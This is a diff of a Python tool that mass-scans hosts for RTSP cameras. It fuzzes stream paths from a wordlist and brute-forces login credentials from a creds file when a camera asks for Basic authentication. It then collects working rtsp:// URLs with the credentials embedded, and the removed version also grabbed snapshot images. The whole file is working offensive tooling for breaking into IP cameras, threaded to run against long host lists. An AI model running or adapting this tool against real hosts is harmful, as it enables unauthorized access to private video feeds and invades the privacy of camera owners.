@@ -1,206 +1,246 @@
 #!/usr/bin/env python
-"""Brute creds, fuzzing paths for RTSP cams.
-See --help for options."""
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
-import sys
+from pathlib import Path
+from socket import SOL_SOCKET, SO_BINDTODEVICE, SocketIO, create_connection, setdefaulttimeout, socket, timeout
+from time import sleep, time
 
 from fire import Fire
+from tqdm import tqdm
 
-from lib.rtsp import capture_image, rtsp_req
-from lib.scan import process_each
-from lib.utils import dt, geoip_str_online, str_to_filename, tmof_retry, interruptable
 
-verbose_level = 0
+fake_path = '/i_am_network_researcher'
+
+work_dir = Path(os.path.dirname(os.path.abspath(__file__)))
+
+data_dir = work_dir / 'data'
+local_dir = work_dir / 'local'
+
+paths_file = data_dir / 'rtsp_paths1.txt'
+creds_file = data_dir / 'rtsp_creds_my.txt'
+
+paths = [fake_path] + [ln.rstrip() for ln in open(paths_file)]
+creds = [ln.rstrip() for ln in open(creds_file)]
+
+cseqs = dict()
 debug = False
 
-FAKE_CAM_DETECT = '/0h84d'
 
-# RTSP (my) client status codes
-CODE_SUCCESS = 200
-CODE_UNAUTHORIZED = 401
-CODE_FAIL = 500
-CODES_INTERESTING = [200, 401, 403]
+def query(connection: socket, url: str = '*') -> tuple[int, dict]:
+    method = 'OPTIONS' if url == '*' else 'DESCRIBE'
 
-C_CAM_FOUND = '@'
-C_CAM_FAKE = '~'
-C_CAM_FAIL = '-'
-C_CAP_OK = 'C'
-C_CAP_ERR = '!'
+    if url == '*':
+        cseq = 0
+    else:
+        cseq = cseqs.get(connection, 0)
 
-# directories to work with
-DIR = os.path.dirname(os.path.abspath(__file__))
-LOCAL_DIR = os.path.join(DIR, 'local')
-DATA_DIR = os.path.join(DIR, 'data')
-CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')
+    cseq += 1
+
+    cseqs[connection] = cseq
+
+    request = (
+        '%s %s RTSP/1.0\r\n'
+        'CSeq: %d\r\n'
+        # 'User-Agent: LibVLC/2.0.1\r\n'
+        '\r\n'
+    ) % (method, url, cseq)
+
+    if debug:
+        print('\n<< %s' % request.rstrip())
+
+    headers = {}
+    try:
+        connection.sendall(request.encode())
+        response = connection.recv(1024).decode()
+
+        if debug:
+            print('\n>> %s' % response.rstrip())
+
+        if response.startswith('RTSP/'):
+            _, code, _ = response.split(None, 2)
+            code = int(code)
+
+            for ln in response.splitlines()[2:]:
+                if not ln:
+                    break
+                if ':' in ln:
+                    k, v = ln.split(':', 1)
+                    headers[k.lower()] = v.strip()
+
+            # cam not uses RFC, fit it
+            if code == 200 and 'WWW-Authenticate' in response:
+                code = 401
+
+            return code, headers
+
+    except KeyboardInterrupt:
+        raise
+    except BrokenPipeError:
+        pass
+    except timeout:
+        pass
+    except ConnectionResetError:
+        pass
+    except UnicodeDecodeError:
+        pass
+    except Exception as e:
+        if debug:
+            print(repr(e))
+        pass
+
+    return 500, headers
 
 
-def prg(t, level=0):
-    if verbose_level >= level:
-        sys.stdout.write(t)
-        sys.stdout.flush()
+def get_url(host: str, port: int = 554, path: str = '', cred: str = '') -> str:
+    if cred:
+        cred = '%s@' % cred
+    return 'rtsp://%s%s:%d%s' % (cred, host, port, path)
 
 
-@tmof_retry
-def wrire_result(stream_url: str):
-    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
-        f.write(f'[{dt()}] {stream_url}\n')
+def connect(host: str, port: int, interface: str = '') -> SocketIO:
+    start = time()
 
-
-@interruptable
-@tmof_retry
-def capture(stream_url, prefer_ffmpeg=False, capture_callback=None):
-    from urllib.parse import urlparse
-
-    up = urlparse(stream_url)
-    p = str_to_filename(f'{up.path}{up.params}')
-
-    img_name = f'{up.hostname}_{up.port}_{up.username}_{up.password}_{p}'
-    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')
-
-    captured = capture_image(stream_url, img_path, prefer_ffmpeg)
-
-    if captured and capture_callback:
-        import subprocess
-        subprocess.Popen([capture_callback, stream_url,
-                          img_path, geoip_str_online(up.hostname)])
-
-    prg(C_CAP_OK if captured else C_CAP_ERR)
-
-
-@interruptable
-def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough, single_cred_enough, interface, capture_img, prefer_ffmpeg, capture_callback):
-    # test some cases that cannot be valid as netloc
-    if '/' in netloc:
-        print('Can\'t use', netloc, 'as target')
-        return
-
-    # no port in host string, adding
-    if ':' not in netloc:
-        netloc = f'{netloc}:{rtsp_port}'
-
-    for path in paths:
-        p_url = f'rtsp://{netloc}{path}'
-
-        code = rtsp_req(p_url, timeout, interface)
-
-        if code >= CODE_FAIL:
-            prg(C_CAM_FAIL)
+    # for OSError, timeout handled only once
+    while time() - start < 3:
+        try:
             if debug:
-                print(f'[ERR ] {code} {p_url}')
+                print('Conn to', host, port)
+            c = create_connection((host, port), 2)
+            if interface:
+                c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
+            if debug:
+                print('Connected to', host, port)
+            return c
+        except KeyboardInterrupt:
+            raise
+        except timeout as e:
+            if debug:
+                print(repr(e))
+            return
+        except OSError as e:
+            if debug:
+                print(repr(e))
+            sleep(1)
+        except Exception as e:
+            if debug:
+                print(repr(e))
             return
 
-        if code == 408:  # timeout
-            prg('t')
-            if debug:
-                print(f'[TIME] {p_url}')
-            return  # next host
 
-        # path has no critical error
-        # but is not ok & not have auth restrictions
-        if code not in CODES_INTERESTING:
-            prg('.', 1)
-            if debug and code != 404:
-                print(f'[NINT] {code} {p_url}')
-            continue
+def process_target(target_params) -> list[str]:
+    host, port, single_path, interface = target_params
+    connection = connect(host, port, interface)
 
-        # path exists, but no cams can have that path in real world
-        if path == FAKE_CAM_DETECT:
-            prg(C_CAM_FAKE)
-            if debug:
-                print(f'[FAKE] {code} {p_url}')
-            # return
+    results = []
 
-        if code >= 400:
-            prg(str(code)[2])
+    if not connection:
+        return results  # next host
 
-        if code == CODE_SUCCESS:
-            if debug:
-                print(f'[HOLE] {p_url}')
-            with pl:
-                wrire_result(p_url)
-                if verbose_level < 0:
-                    print(p_url)
-                if capture_img:
-                    capture(p_url, prefer_ffmpeg, capture_callback)
-            continue
+    with connection:
+        # OPTIONS query
+        code, _ = query(connection)
 
-        # path exists (in CODES_INTERESTING) & not fake
-        # will try to check creds
-        for cred in creds:
-            c_url = f'rtsp://{cred}@{netloc}{path}'
-            code = rtsp_req(c_url, timeout, interface)
+        if code != 200:
+            return results
 
-            if code >= CODE_FAIL:
-                prg(C_CAM_FAIL)
-                if debug:
-                    print(f'[ERR ] {code} {c_url}')
-                return []
+        for path in paths:
+            url = get_url(host, port, path)
+            code, headers = query(connection, url)
 
-            if code != CODE_SUCCESS:
-                if debug:
-                    print(f'[FAIL] {code} {c_url}')
+            # 451 is bad URL in DESCRIBE request
+            # can be just path or with "?" at end
+            # >> fixed by paths file
+            # if code == 451:
+            # code = query(connection, path)
+            # return results
+
+            if code >= 500:
+                return results
+
+            # potential ban?
+            if code == 403:
+                return results
+
+            if code == 200:
+                # if fake_path is ok,
+                # root path will be ok too
+                if path == fake_path:
+                    url = get_url(host, port, '/')
+
+                results.append(url)
+
+                if single_path:
+                    return results
+
                 continue
 
-            prg(C_CAM_FOUND)
+            if code == 401:
+                auth = headers['www-authenticate']
 
-            with pl:
-                wrire_result(c_url)
-                if verbose_level < 0:
-                    print(c_url)
-                if capture_img:
-                    capture(c_url, prefer_ffmpeg, capture_callback)
+                if auth.startswith('Digest'):
+                    if debug:
+                        print('IMPLEMENT DIGEST AUTH, DEV!!1 =(')
+                    return results
 
-            if single_cred_enough:
+                # bruteforcing creds
+                for cred in creds:
+                    url = get_url(host, port, path, cred)
+                    code, headers = query(connection, url)
+
+                    if code >= 500:
+                        return results
+
+                    if code == 200:
+                        results.append(url)
+                        if single_path:
+                            return results
+                        break  # one cred per path is enough
+
+                # if no one cred accepted,
+                # we have no cred for another paths i think
                 break
 
-        if single_path_enough:
-            return
-        # if not authorized by any cred:
-        # 1. cam has no more accounts
-        #    from our dict (need return)
-        # 2. path has no more accounts
+    return results
 
 
-def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=True, ff=False, capture_callback=None, d=False):
-    """Brute creds, fuzzing paths for RTSP cams
-
-    :param str hosts_file: File with lines ip:port or just ips
-    :param int p: Default port to use if not specified in file
-    :param float t: Timeout for queries
-    :param str i: Network interface to use
-    :param int ht: Threads count for hosts
-    :param bool capture: Capture images
-    :param int v: Verbose level
-    :param bool s: Silent mode
-    :param str P: paths file
-    :param str C: creds file
-    :param bool sp: end process host after single successful path
-    :param bool sc: end process path after single successful cred
-    :param bool ff: prefer ffmpeg over opencv
-    """
-    global verbose_level
+def main(H='', w=None, sp=False, i='', d=False):
     global debug
-
-    verbose_level = v
     debug = d
+    results = []
+    hosts_file_path = H or local_dir / 'hosts_554.txt'
 
-    if s:
-        verbose_level = -1
+    setdefaulttimeout(3)
 
-    if capture and not os.path.exists(CAPTURES_DIR):
-        os.mkdir(CAPTURES_DIR)
+    with ThreadPoolExecutor(w) as executor:
+        with open(hosts_file_path) as hosts_file:
+            futures = {}
 
-    with open(P or os.path.join(DATA_DIR, 'rtsp_paths_my.txt')) as f:
-        paths = [FAKE_CAM_DETECT] + [ln.rstrip() for ln in f]
+            for line in hosts_file:
+                host = line.rstrip()
+                port = 554
 
-    with open(C or os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
-        creds = [ln.rstrip() for ln in f]
+                if ':' in host:
+                    host, port = host.split(':')
 
-    with open(hosts_file or os.path.join(LOCAL_DIR, f'hosts_{p}.txt')) as f:
-        hosts = (ln.rstrip() for ln in f)
-        process_each(check_host, hosts, ht, paths,
-                     creds, p, t, sp, sc, i, capture, ff, capture_callback)
+                arg = (host, port, sp, i)
+
+                future = executor.submit(process_target, arg)
+                futures[future] = arg
+
+            with tqdm(total=len(futures)) as progress:
+                for future in as_completed(futures):
+                    host, port, *_ = futures[future]
+                    res = future.result()
+                    progress.update()
+                    results += res
+
+    for result in results:
+        print(result)
 
 
 if __name__ == "__main__":
-    Fire(main)
+    try:
+        Fire(main)
+    except KeyboardInterrupt:
+        print('Interrupted by user')
+        exit(130)
